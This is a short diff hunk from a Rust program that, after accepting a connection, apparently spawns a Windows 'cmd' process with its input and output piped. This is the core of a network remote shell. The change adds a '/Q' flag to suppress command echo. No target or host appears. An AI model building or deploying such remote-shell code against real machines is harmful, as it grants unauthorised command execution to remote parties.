@@ -52,6 +52,7 @@ fn main() {
             println!("Connected to: {}", peer_addr);
 
             let mut process = Command::new("cmd")
+                                      .arg("/Q") //turn off the echo
                                       .stdin(Stdio::piped())
                                       .stdout(Stdio::piped())
                                       .stderr(Stdio::piped())
